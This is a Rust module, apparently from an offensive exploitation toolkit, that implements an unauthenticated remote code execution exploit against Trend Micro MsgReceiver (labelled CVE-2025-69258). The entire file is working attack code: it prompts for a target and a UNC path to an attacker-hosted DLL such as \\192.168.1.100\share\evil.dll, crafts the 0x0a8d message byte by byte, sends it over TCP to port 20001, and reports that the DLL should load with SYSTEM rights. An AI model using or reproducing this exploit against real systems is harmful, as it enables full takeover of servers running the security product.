use anyhow::{Context, Result};
use colored::*;
use tokio::net::TcpStream;
use byteorder::{BigEndian, LittleEndian, WriteBytesExt};
use crate::utils::{prompt_default, prompt_required, prompt_port, prompt_yes_no, normalize_target};

const DEFAULT_PORT: u16 = 20001;

pub async fn run(target: &str) -> Result<()> {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║    Trend Micro MsgReceiver LoadLibraryEx RCE              ║".cyan());
    println!("{}", "║    (CVE-2025-69258) - Unauthenticated DLL Loading         ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());

    // Parse target
    let target_host = if target.is_empty() {
        prompt_required("Target IP/Hostname")?
    } else {
        normalize_target(target)?
    };
    
    // Extract host without protocol
    let target_host = target_host
        .trim_start_matches("http://")
        .trim_start_matches("https://")
        .split(':')
        .next()
        .unwrap_or(&target_host)
        .to_string();
    
    let port = prompt_port("Port", DEFAULT_PORT)?;

    println!("[*] Target: {}:{}", target_host, port);

    loop {
        println!("\n{}", "Select mode:".cyan());
        println!("1. Exploit (Load Remote DLL)");
        println!("2. Exit");
        
        let choice = prompt_default("Select option", "1")?;

        match choice.as_str() {
            "1" => {
                let dll_path = prompt_required("DLL Path (e.g., \\\\192.168.1.100\\share\\evil.dll)")?;

                if dll_path.is_empty() {
                    println!("{}", "[-] DLL path cannot be empty.".red());
                    continue;
                }
                
                if prompt_yes_no("Send exploit payload?", false)? {
                    exploit(&target_host, port, &dll_path).await?;
                }
            }
            "2" => break,
            _ => println!("{}", "Invalid choice".red()),
        }
    }

    Ok(())
}

async fn exploit(host: &str, port: u16, dll_path: &str) -> Result<()> {
    let addr = format!("{}:{}", host, port);
    println!("[*] Connecting to {}...", addr);
    
    let mut stream = TcpStream::connect(&addr).await
        .context("Failed to connect to target")?;

    // Message 0x0a8d structure:
    // struct hdr { be32 MsgSize; byte unk[9]; };
    // struct msg_0a8d { hdr h; le16 MsgId; x_astring handler; le32 flag; };
    // x_astring { le32 size; byte data[size]; };

    let msg_id: u16 = 0x0a8d;
    let flag: u32 = 1; // 1 = install handler

    // Prepare DLL path string (null-terminated)
    let dll_bytes = format!("{}\0", dll_path).into_bytes();
    let dll_len = dll_bytes.len() as u32;

    // Body = MsgId (2) + DLL_Size (4) + DLL_Data (dll_len) + Flag (4)
    let body_size = 2 + 4 + dll_len + 4;
    
    // Header = MsgSize (4) + unk (9) = 13 bytes
    // Total = Header + Body
    let total_msg_size = 13 + body_size;

    let mut buffer = Vec::new();

    // Header
    buffer.write_u32::<BigEndian>(total_msg_size)?;
    buffer.extend_from_slice(&[0u8; 9]);

    // Body
    buffer.write_u16::<LittleEndian>(msg_id)?;
    buffer.write_u32::<LittleEndian>(dll_len)?;
    buffer.extend_from_slice(&dll_bytes);
    buffer.write_u32::<LittleEndian>(flag)?;

    println!("[*] Sending 0x0a8d message with DLL: {}", dll_path);
    println!("[*] Payload size: {} bytes", buffer.len());
    
    tokio::io::AsyncWriteExt::write_all(&mut stream, &buffer).await
        .context("Failed to write to socket")?;
    
    println!("{}", "[+] Payload sent successfully!".green());
    println!("[*] If successful, your DLL should now be loaded in SYSTEM context.");
    println!("[*] Check your listener or DLL execution status.");

    Ok(())
}
